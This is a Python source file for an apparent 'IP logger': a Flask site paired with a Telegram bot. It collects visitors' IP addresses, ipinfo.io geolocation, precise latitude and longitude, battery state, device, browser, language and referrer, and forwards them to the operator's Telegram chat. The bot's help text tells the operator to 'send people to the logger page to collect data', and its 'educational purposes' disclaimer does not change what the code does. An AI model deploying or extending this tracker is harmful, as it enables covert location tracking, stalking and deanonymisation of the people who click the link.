from flask import Flask, request, render_template
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import threading
import requests
from datetime import datetime
from config import BOT_TOKEN, CHAT_ID

# --- Flask App Setup ---
app = Flask(__name__)

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}
    requests.post(url, data=data)

def get_ip_info(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json").json()
        return {
            "ip": ip,
            "city": response.get("city", ""),
            "region": response.get("region", ""),
            "country": response.get("country", ""),
            "loc": response.get("loc", ""),
            "org": response.get("org", "")
        }
    except:
        return {"ip": ip}

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    forwarded = request.headers.get('X-Forwarded-For', request.remote_addr)
    real_ip = forwarded.split(",")[0].strip()
    ip_info = get_ip_info(real_ip)

    msg = f"""📥 <b>New Click Logged!</b>

🌐 <b>IP:</b> {ip_info.get("ip")}
🌎 <b>Country:</b> {ip_info.get("country")} | <b>City:</b> {ip_info.get("city")}
📡 <b>ISP:</b> {ip_info.get("org")}

📍 <b>Latitude:</b> {data.get("lat")},<b>longitude:</b> {data.get("lon")}
🔋 <b>Battery:</b> {data.get("battery_level", '?')}% (Charging: {data.get("charging", '?')})

📱 <b>Device:</b> {data.get("device")}
🧠 <b>Browser:</b> {data.get("browser")}
📏 <b>Screen:</b> {data.get("screen")}
🗣 <b>Language:</b> {data.get("language")}
🕒 <b>Timezone:</b> {data.get("timezone")}
🔗 <b>Referrer:</b> {data.get("referrer") or 'None'}

🕒 <b>Time:</b> {datetime.now().strftime('%d-%b-%Y %I:%M %p')}
"""
    send_telegram(msg)
    return {'status': 'ok'}

def run_flask():
    app.run(debug=True, use_reloader=False)

# --- Telegram Bot Setup ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_html(
        "<b>👋 Welcome to Logger Bot!</b>\n\n"
        "This bot helps you collect IP and device info from website visitors.\n"
        "📊 Use responsibly & only for educational purposes.\n\n"
        "To get started, share your logger page.\n"
        "Need help? Type /help"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🛠 This bot works with your logger site.\n"
        "Just send people to the logger page to collect data.\n"
        "Use /start to see the intro again."
    )

def run_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    print("🤖 Telegram bot running...")
    app.run_polling()

# --- Main Run ---
if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    bot_thread = threading.Thread(target=run_bot)

    flask_thread.start()
    bot_thread.start()

    flask_thread.join()
    bot_thread.join()
